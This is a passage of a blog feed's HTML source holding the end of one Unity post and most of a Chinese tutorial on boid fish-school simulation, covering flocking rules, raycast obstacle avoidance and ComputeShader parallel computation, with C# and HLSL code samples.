Vector3.Cross(pD - pB, pA - pB)) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="built_in">bool</span> <span class="title">DetectSmallAngle</span>(<span class="params">Vector2 vec1, Vector2 vec2, <span class="built_in">float</span> angleOffset</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">if</span> (Vector2.Angle(vec1, vec2) &lt; angleOffset)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>    </div></div><div class='spoiler collapsed'>    <div class='spoiler-title'>        Particles    </div>    <div class='spoiler-content'>        <figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> UnityEngine;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Particle</span> : <span class="title">MonoBehaviour</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> sizePow;</span><br><span class="line">    [<span class="meta">HideInInspector</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">new</span> ParticleSystem particleSystem;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Awake</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        particleSystem = GetComponent&lt;ParticleSystem&gt;();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">SetParticleRot</span>(<span class="params"><span class="built_in">float</span> angle</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">var</span> sh = particleSystem.shape;</span><br><span class="line">        sh.enabled = <span class="literal">true</span>;</span><br><span class="line">        sh.shapeType = ParticleSystemShapeType.Rectangle;</span><br><span class="line">        sh.rotation = <span class="keyword">new</span> Vector3(<span class="number">0f</span>, angle, <span class="number">0f</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">SetParticleDis</span>(<span class="params"><span class="built_in">float</span> dis</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">var</span> main = particleSystem.main;</span><br><span class="line">        <span class="built_in">float</span> speed = main.startSpeed.constant;</span><br><span class="line">        main.startLifetime = dis / speed;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// max Size = 2.5, min Size = 0.5</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">SetParticleSize</span>(<span class="params"><span class="built_in">float</span> sizeRatio</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">var</span> main = particleSystem.main;</span><br><span class="line">        sizeRatio = Mathf.Pow(sizeRatio, sizePow);</span><br><span class="line">        <span class="built_in">float</span> size = sizeRatio * <span class="number">2.5f</span>;</span><br><span class="line">        main.startSize = size &gt; <span class="number">0.5f</span>? size : <span class="number">0f</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>    </div></div><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> Unity </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Unity - Compute Shader and Boid</title>
      <link href="2021/09/23/Unity-ComputeShaderAndBoid/"/>
      <url>2021/09/23/Unity-ComputeShaderAndBoid/</url>
      
        <content type="html"><![CDATA[<p>最近刷油管看到一个关于生物群模拟的Unity小项目，其中提到了使用ComputeShader来实现多线程的并行计算，感觉很适合入门，就做了一些尝试和改良</p><p><img src="/images/Boid_Cover.png"></p><span id="more"></span><h1 id="Compute-Shader-and-Boid"><a href="#Compute-Shader-and-Boid" class="headerlink" title="Compute Shader and Boid"></a>Compute Shader and Boid</h1><p><img src="/images/Boid_WholeFinish.png"></p><ul><li>首先，什么是<code>ComputeShader</code>？</li></ul><blockquote><p>A <strong>Compute Shader</strong> is a Shader Stage that is used entirely for computing arbitrary information. While it can do rendering, it is generally used for tasks not <em>directly</em> related to drawing triangles and pixels.</p></blockquote><p>简单地说，就是一个把任务从CPU移到GPU计算的shader就是ComputeShader。关于为什么要这么做，GPU是善于处理高度统一，重复性高的计算的，可以一次性把大量数据写入buffer，然后进行并发的计算，在实际表现中，使用了ComputeShader后的性能提升比纯C#脚本的效率提升了至少两倍</p><p>具体说说并发计算，其实也就是多线程，GPU进行多线程计算时，会等到当前buffer中的最后一项操作执行完成后再返回，这就导致类似短板效应的“长板效应”，我的粗略理解为执行一轮计算的时间是需要操作次数最多的一个线程，于是很明显，ComputeShader不能用于分支多，运行时间差异大的算法</p><ul><li>其次，什么是<code>Boid</code>？</li></ul><p>对于生物群的模拟，根据 <a href="http://www.cs.toronto.edu/~dt/siggraph97-course/cwr87/">这篇文章</a>，可以简单把生物群的行为抽象为以下三条</p><blockquote><ol><li>Collision Avoidance: avoid collisions with nearby flockmates</li><li>Velocity Matching: attempt to match velocity with nearby flockmates</li><li>Flock Centering: attempt to stay close to nearby flockmates</li></ol></blockquote><p>也就是：避免碰撞，速度匹配，位置居中。还有不同的抽象方法，越细致的规则能塑造的群体必然也会越复杂，但其实只要应用了这三个规则，就已经很够看了</p><hr><p>本工程将群落明确为鱼群，接下来将会从鱼群的抽象规则进行小规模模拟，到应用ComputeShader模拟大规模鱼群，最后使用ShaderGraph制作鱼的摆动以及水面来完善整个工程，为其润色</p><blockquote><p>其实当真的敲代码的时候会发现约束鱼群的规则都非常简单，但是多个个体所组成的系统确实复杂的</p></blockquote><h2 id="Getting-Start"><a href="#Getting-Start" class="headerlink" title="Getting Start"></a>Getting Start</h2><p>因为我自己也是Unity入门，对于里面的Rigibody之类的内置力学系统不太了解，也不知道通常的处理这类力学问题的解决方案，恰好我手上拿到的油管dalao的示例代码用的是公式法，即将速度，加速度都保存在变量里，我就照搬他的做法了</p><p>为了后期的调参便利（调参真的是一个很麻烦的事情），我将根据三条规则所产生的加速度捆绑为一种类型的加速度，再将规避障碍物的加速度捆绑为另一种加速度，然后对每种类型的加速度分别进行更细致的权重分配</p><p>为了便于管理鱼群的行为，将 处理当前的鱼与其他剩余的鱼的代码 与 鱼自身Update的代码 分开编辑是很重要的，不管是编辑的便利还是运行的效率，每次查找其他鱼的时候都<code>FindObjectsOfType&lt;Boid&gt;()</code>一个新的列表是完全没有必要的，所以把这部分与其他鱼产生联系的代码抽象为一个<code>BoidManager</code>类，把更新自身速度等信息的代码放在<code>Boid</code>自己的类里面作为成员才是合理的</p><ul><li><p>关键函数：</p><p>  <code>FindObjectsOfType&lt;Boid&gt;()</code>  按类查找</p><p>  <code>Awake() </code> 与 <code>Start()</code>  注意<code>Awake</code>方法比<code>Start</code>先执行就行</p></li></ul><img src="/images/Boid_UnityLifeCircle.webp" alt="Boid_UnityLifeCircle" style="zoom: 80%;" /><h2 id="Rules"><a href="#Rules" class="headerlink" title="Rules"></a>Rules</h2><h3 id="Collision-Avoidance"><a href="#Collision-Avoidance" class="headerlink" title="Collision Avoidance"></a>Collision Avoidance</h3><p>当前对象与每条鱼位置向量之差即为偏移量，用偏移量的单位向量除以偏移量的模以获得一个基于位置远近的加速度即可</p><center><code>avoidAcceleration -= posOffest.normalized / posOffset.magnitude</code></center><h3 id="Velocity-Matching"><a href="#Velocity-Matching" class="headerlink" title="Velocity Matching"></a>Velocity Matching</h3><p>当前对象与每条鱼朝向向量之差即为偏移量，因为其实实际运行中速度的大小差异不会很大，速度方向却会有很大差异，所以只用匹配一下朝向即可</p><center><code>headingAcceleration += forwardOffest</code></center><h3 id="Flock-Centering"><a href="#Flock-Centering" class="headerlink" title="Flock Centering"></a>Flock Centering</h3><p>这其实就是第一条规则去掉距离远近的加权</p><h3 id="Result"><a href="#Result" class="headerlink" title="Result"></a>Result</h3><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> anoBoidIndex = <span class="number">0</span>; anoBoidIndex &lt; boids.Length; anoBoidIndex++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (boidIndex != anoBoidIndex) &#123;</span><br><span class="line">        Vector3 offest = boids[boidIndex].transform.position - boids[anoBoidIndex].transform.position;</span><br><span class="line">        <span class="built_in">float</span> sqrDis = offest.sqrMagnitude;</span><br><span class="line">        <span class="keyword">if</span> (sqrDis &lt; viewRadius * viewRadius) &#123;</span><br><span class="line">            headingAcceleration += boids[anoBoidIndex].transform.forward - boids[boidIndex].transform.forward;</span><br><span class="line">            centerAcceleration -= offest;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (sqrDis &lt; avoidRadius * avoidRadius) avoidAcceleration += offest.normalized / sqrDis;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">boids[boidIndex].acceleration = avoidAcceleration * avoidWeight + headingAcceleration * headingWeight + centerAcceleration * centerWeight;</span><br></pre></td></tr></table></figure><p>其中引入了几个Radius作为是否影响当对象的阈值以限制鱼的视力范围</p><p>应用了三个规则后可以如下GIF的效果</p><p><img src="/images/Boid_Rules.gif"></p><center><small>（红色的那条是0号鱼(初号机)，为的是便于从个体的视角观察动向）</small></center><p>我在一个圆内在随机的位置以随机的朝向生成了一些鱼，不难发现他们很快就会根据自己的位置与朝向形成几个鱼群，但这些鱼群都十分稳定，这是因为虽然他们受群聚规则的限制，但没有一个外力来破坏这一规则限制出的稳定结构，我们想看到的必然不是一个稳定结构的鱼群</p><p>对于外力，我们可以选择增加一个驱逐者来追赶鱼群，类似于 <a href="www.bilibili.com/video/BV1tq4y1j7TW">这个视频</a>，也可以增加障碍物来阻挡鱼群，在此为了场景的多样性，我选择后者</p><h2 id="Obstacle-Avoidance"><a href="#Obstacle-Avoidance" class="headerlink" title="Obstacle Avoidance"></a>Obstacle Avoidance</h2><p>其实上述的鱼群行动规则非常简单，不管是字面上看起来还是代码上敲起来，这也使得在空旷环境中的鱼群看起来很没意思，所以加入一个避障的function来使它更有趣吧</p><p>要使鱼避开前方的障碍物，首先想到的便是<code>Physics.Raycast()</code>射线检测，但此函数对CPU貌似不怎么友好，大量运行此函数卡成PPT，而单个的射线检测也是检测到物体时就返回了，均具有执行时间具有高度不确定性的特征，不适宜使用ComputeShader来提速，故唯一的解决方案就是尽可能地减少射线数量</p><p>在示例工程中，这位老哥使用了 <a href="https://stackoverflow.com/questions/9600801/evenly-distributing-n-points-on-a-sphere/44164075#44164075">这种方法</a> 来使点阵在球面上近似均匀分布，然后对每个点做射线检测，大致是对黄金螺线做极径开个根号，使得螺线上的点均匀摊开，BEAUTIFUL</p><p><img src="/images/Boid_DIvideSphere1.png"></p><p>而从圆面到球面，把极径换成φ就过来了</p><p><img src="/images/Boid_DIvideSphere2.png"></p><p>表达可能不太清楚，但只要动手调一下参，模拟一下螺线的变化就很明白了</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">const</span> <span class="built_in">int</span> numDivide = <span class="number">15</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">const</span> <span class="built_in">float</span> viewAngleRatio = <span class="number">4f</span> / <span class="number">5f</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">readonly</span> Vector3[] viewVec3;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">int</span> numViewDirections = Mathf.CeilToInt(numDivide * viewAngleRatio);</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">BoidHelper</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    viewVec3 = <span class="keyword">new</span> Vector3[BoidHelper.numDivide];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">float</span> goldenRatio = (<span class="number">1</span> + Mathf.Sqrt(<span class="number">5</span>)) / <span class="number">2f</span>;</span><br><span class="line">    <span class="built_in">float</span> angleIncrement = Mathf.PI * <span class="number">2</span> * goldenRatio;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; numViewDirections; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">float</span> t = (<span class="built_in">float</span>)i / numDivide;</span><br><span class="line">        <span class="built_in">float</span> inclination = Mathf.Acos(<span class="number">1</span> - <span class="number">2</span> * t);</span><br><span class="line">        <span class="built_in">float</span> azimuth = angleIncrement * i;</span><br><span class="line"></span><br><span class="line">        viewVec3[i].x = Mathf.Sin(inclination) * Mathf.Cos(azimuth);</span><br><span class="line">        viewVec3[i].y = Mathf.Sin(inclination) * Mathf.Sin(azimuth);</span><br><span class="line">        viewVec3[i].z = Mathf.Cos(inclination);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>示例工程中这位老哥应该也是怕射线太多导致卡顿，方案比较暴力，就是从前方开始检测，一旦检测到空旷处就直接加个距离的权重然后应用到加速度上并直接<code>break</code>掉循环了，也就是说鱼会朝着第一个检测到的空旷处游去。</p><p><img src="/images/Boid_Close2Ground.png"></p><p>这不免导致了一个问题，那就是鱼最后会和障碍物表面相切，然后贴着障碍物表面移动，先不说这样会导致在下一次受到扰动时穿模的问题，这种款式的鱼群简直像极了一群大耗子</p><p><img src="/images/Boid_StickToGround.gif"></p><p>所以既然在场景不会很复杂的时候使用这么多射线属实没有必要，经过实际测试，使用几条射线分辨侧面环境并且不<code>break</code>射线检测的循环，使鱼充分认知到周围环境，将此与上述等分检测的方法组合便是一个更优解，此处我选择的是12条射线，即xy平面上60°等分，再在φ=45°的圆周上也60°等分</p><p><img src="/images/Boid_Close2GroundFix.png"></p><p>避障的相关代码因为不涉及其他鱼，选择把代码放在了<code>Boid</code>类下，但这会导致调参的时候需要在Unity中频繁切换Inspector，解决方案是把参数全部放到一个<code>Setting</code>类中，此类继承<code>ScriptableObject</code>，这样不仅解决了Inspector的问题，还使得Prefab在被拷贝时通过reference访问数据，避免了多次拷贝造成的内存浪费，也提升了在运行中调参时的整体性，运行中进行的调参也得以直接保存而不用Copy Component Values了</p><h3 id="Front"><a href="#Front" class="headerlink" title="Front"></a>Front</h3><p>在进行正面避障时，如果提供的射线少了则会使得鱼的速度方向变化过大，不够平滑，所以正面避障直接采用黄金螺旋法在球面上等距取点，从正面开始遍历这些点，一旦取到一个可转向的范围就<code>break</code>即可</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Vector3 <span class="title">AvoidObstacleDir</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; BoidHelper.numViewDirections; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        Vector3 viewDir = transform.TransformDirection(BoidHelper.viewVec3[i]);</span><br><span class="line">        Ray ray = <span class="keyword">new</span> Ray(transform.position, viewDir);</span><br><span class="line">        <span class="keyword">if</span> (!Physics.Raycast(ray, obstacleRadius, obstacleMask)) <span class="keyword">return</span> viewDir;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> Vector3.zero;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Around"><a href="#Around" class="headerlink" title="Around"></a>Around</h3><p>示例工程中因为缺少了对周围障碍物的检测，导致了大量因为贴近物体表面移动而穿过Collider的行为，所以在周围加入少量的<code>Raycast</code>，使得鱼也不会过于靠近四周的障碍</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Vector3 <span class="title">KeepDstWithObstDir</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    Vector3 keepDstDir = Vector3.zero;</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; circleFrac; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        Vector3 viewDir = Vector3.zero;</span><br><span class="line">        <span class="built_in">float</span> angle = i / (<span class="built_in">float</span>)circleFrac * <span class="number">2</span> *Mathf.PI;</span><br><span class="line">        viewDir.x = Mathf.Sin(angle);</span><br><span class="line">        viewDir.y = Mathf.Cos(angle);</span><br><span class="line">        viewDir = transform.TransformDirection(viewDir);</span><br><span class="line">        Ray ray = <span class="keyword">new</span> Ray(transform.position, viewDir);</span><br><span class="line">        RaycastHit hit;</span><br><span class="line">        <span class="keyword">if</span> (Physics.Raycast(ray,<span class="keyword">out</span> hit, keepDstWithObstRadius, obstacleMask)) keepDstDir -= viewDir / hit.distance;</span><br><span class="line">        <span class="comment">// cos(PI/4) is close to 0.7071</span></span><br><span class="line">        <span class="built_in">float</span> angleOffset = <span class="number">1</span> / (<span class="built_in">float</span>)circleFrac * Mathf.PI;</span><br><span class="line">        viewDir.x = Mathf.Sin(angle + angleOffset) * <span class="number">0.7071f</span>;</span><br><span class="line">        viewDir.y = Mathf.Cos(angle + angleOffset) * <span class="number">0.7071f</span>;</span><br><span class="line">        viewDir.z = <span class="number">0.7071f</span>;</span><br><span class="line">        viewDir = transform.TransformDirection(viewDir);</span><br><span class="line">        ray = <span class="keyword">new</span> Ray(transform.position, viewDir);</span><br><span class="line">        <span class="keyword">if</span> (Physics.Raycast(ray,<span class="keyword">out</span> hit, keepDstWithObstRadius, obstacleMask)) keepDstDir -= viewDir / hit.distance;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> keepDstDir.normalized;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Result-1"><a href="#Result-1" class="headerlink" title="Result"></a>Result</h3><p>至此鱼群的模拟已经基本完成，接下来要做的便是将<code>Rules</code>部分的代码移植到ComputeShader中计算，以减轻CPU的负担</p><p><img src="/images/Boid_BasicResult.gif"></p><p>除了使用障碍物破坏鱼群的稳定结构，加入捕食者、食物之类的机制也可以为鱼群系统增添复杂性与趣味性，不妨自己尝试一下</p><h2 id="Compute-Shader"><a href="#Compute-Shader" class="headerlink" title="Compute Shader"></a>Compute Shader</h2><h3 id="WTF-is-this"><a href="#WTF-is-this" class="headerlink" title="WTF is this"></a>WTF is this</h3><p>不妨使用文档中的示例来解释一下ComputeShader，下面这个ComputeShader将一个材质涂红</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#pragma kernel FillWithRed</span><br><span class="line">RWTexture2D&lt;float4&gt; res;</span><br><span class="line">[numthreads(1,1,1)]</span><br><span class="line">void FillWithRed (uint3 dtid : SV_DispatchThreadID)</span><br><span class="line">&#123;</span><br><span class="line">    res[dtid.xy] &#x3D; float4(1,0,0,1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可见ComputeShader使用<code>HLSL</code>语言，也就是<code>High Level Shader Language</code>，因为通常只是拿来做数学计算，所以基本上只要装一个hlsl的代码提示的extension就可以直接开始写了</p><p><code>#pragma kernel FillWithRed</code>：首先定义了一个核函数，函数名默认是CSMain，这是compute shader的函数入口，你也可以定义多个入口，因为本工程只需要一个入口，多个入口的ComputeShader暂时没有多做了解</p><p><code>[numthreads(1,1,1)]</code>：规定了使用的线程组大小，这里使用的是单线程，默认是<code>(8,8,1)</code>，线程数量为<code>8x8x1</code>，也就是64线程作为一个线程组。<a href="https://blog.csdn.net/weixin_38884324/article/details/80570160">更多地了解numthreads</a> 会发现里面东西挺多，涉及到显卡的硬件</p><img src="/images/Boid_ThreadGroup.png" alt="Boid_ThreadGroup" style="zoom:50%;" /><p>如上图，<code>numthreads</code>规定了一个Group(线程组)中的线程数量，<code>Dispatch()</code>作为C#脚本调用ComputeShader的交互方式，与<code>numthread</code>有一些联系，在介绍完Unity的官方ComputeShader示例后会提到。至于为什么大小由一个三维数组确定，是为了在访问2D或者3D的数据结构的时候更加方便操作(大概是吧)</p><blockquote><p>The ability to specify the size of the thread group across three dimensions allows individual threads to be accessed in a manner that logically 2D and 3D data structures</p><p align="right"><a herf="https://docs.microsoft.com/en-us/windows/win32/direct3dhlsl/sm5-attributes-numthreads">--Microsoft Doc</a></p></blockquote><p>在实际使用中，一般不会使<code>numthreads</code>小于32，这会达不到最低线程数导致多核围观；但也不能超过1024，应该也是硬件层面的限制。根据之前提到的CSDN上的建议：</p><blockquote><p>AMD：ThreadSize 使用 64 的倍數 ( wavefront 架構 )<br>NVIDIA：ThreadSize 使用 32 的倍數 ( SIMD32 (Warp) 架構 )</p></blockquote><p>这么一看官方初始线程数选择64还挺合理的，但我们仍然需要根据自己的实际需求以及预期的线程组数来选择具体的<code>numthread</code></p><p><code>ID</code>：在声明方法时提到了<code>ID</code>的概念，即<code>void FillWithRed (uint3 dtid : SV_DispatchThreadID)</code>中的<code>SV_DispatchThreadID</code>，其实这些三维的<code>ID</code>基本上就是<code>index</code>了</p><blockquote><p>SV_GroupID : 線程組 ID<br>SV_GroupThreadID : 線程組內的線程 ID (三維，你可以理解為 Group 內的座標)<br>SV_GroupIndex : 線程組內的線程 ID (一維)<br>SV_DispatchThreadID : 唯一ID (你可以理解成整張圖片座標)</p></blockquote><img src="/images/Boid_ID.png" alt="Boid_ID" style="zoom:50%;" /><p><code>Dispatch(kernelIndex,x,y,z)</code>：用于在C#脚本中调用ComputeShader，第一个参数为核函数的index，如果是CSMain就直接是0，如果不确定index到底是多少，可以通过<code>FindeKernel(String kernelName)</code>获取index。关于后面的xyz，需要满足<code>Dispatch*numthread&gt;=numData</code>，否则既然你的输入都不全，怎么获得一个完整的输出呢？</p><p>举几个栗子：</p><ul><li><p>Eg1.输出ComputeShader的默认代码</p><p>  ComputeShader在Unity中创建时初始化代码如下</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Each #kernel tells which function to compile; you can have many kernels</span><br><span class="line">#pragma kernel CSMain</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Create a RenderTexture with enableRandomWrite flag and set it</span><br><span class="line">&#x2F;&#x2F; with cs.SetTexture</span><br><span class="line">RWTexture2D&lt;float4&gt; Result;</span><br><span class="line"></span><br><span class="line">[numthreads(8,8,1)]</span><br><span class="line">void CSMain (uint3 id : SV_DispatchThreadID)</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;&#x2F; TODO: insert actual code here!</span><br><span class="line"></span><br><span class="line">    Result[id.xy] &#x3D; float4(id.x &amp; id.y, (id.x &amp; 15)&#x2F;15.0, (id.y &amp; 15)&#x2F;15.0, 0.0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  可以使用一个C#脚本调用它</p>  <figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> UnityEngine;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Tester</span> : <span class="title">MonoBehaviour</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> ComputeShader cs;</span><br><span class="line">    <span class="keyword">public</span> RenderTexture tex;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Start</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="comment">// 创建一个材质查看结果</span></span><br><span class="line">        tex = <span class="keyword">new</span> RenderTexture(<span class="number">256</span>,<span class="number">256</span>,<span class="number">24</span>);</span><br><span class="line">        <span class="comment">// 一定要记得打开写入权限</span></span><br><span class="line">        tex.enableRandomWrite = <span class="literal">true</span>;</span><br><span class="line">        tex.Create();</span><br><span class="line">        <span class="comment">// 在Dispatch前需要先传入参数</span></span><br><span class="line">        cs.SetTexture(<span class="number">0</span>, <span class="string">&quot;Result&quot;</span>, tex);</span><br><span class="line">        <span class="comment">// 注意到numthread为(8,8,1)，有numthread*Dispatch=Resolution</span></span><br><span class="line">        cs.Dispatch(<span class="number">0</span>, <span class="number">256</span>/<span class="number">8</span>, <span class="number">256</span>/<span class="number">8</span>, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  得到一个好康的分形图案</p><p>  <img src="/images/Boid_CSdefault.png"></p></li><li><p>Eg2.将参数改小</p><p>  <code>Dispatch(0,64/8,128/8,1);</code></p><p>  <code>numthread[8,8,1];</code></p><p>  <img src="/images/Boid_CSeg2.png"></p><p>  观察到图像不全且只有64x128，与Dispatch中传入的量吻合</p></li><li><p>Eg3.将参数改大</p><p>  <code>tex = new RenderTexture(256,300,24);</code></p><p>  <code>Dispatch(0,256/8,(int)Mathf.Ceil(300/8),1);</code></p><p>  <code>numthread[8,8,1];</code></p><p>  <img src="/images/Boid_CSeg3.png"></p><p>  注意到<code>(int)Mathf.Ceil(300/8) * 8 &gt; 300</code>，如果此处不用<code>Ceil</code>向上取整则会少一部份没有被计算</p></li></ul><h3 id="Translation"><a href="#Translation" class="headerlink" title="Translation"></a>Translation</h3><p><code>C#</code>翻译到<code>hlsl</code>的工作流程如下</p><p>首先是C#脚本上</p><ul><li><p>创建结构体保存一些属性，其中<code>acceleration</code>作为计算结果，等待在ComputeShader中被赋值</p>  <figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">struct</span> BoidData &#123;</span><br><span class="line">    <span class="keyword">public</span> Vector3 position;</span><br><span class="line">    <span class="keyword">public</span> Vector3 forward;</span><br><span class="line">    <span class="keyword">public</span> Vector3 acceleration;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">int</span> Size &#123;</span><br><span class="line">        <span class="keyword">get</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">sizeof</span> (<span class="built_in">float</span>) * <span class="number">3</span> * <span class="number">3</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  实例化，赋值，创建Buffer</p>  <figure class="highlight 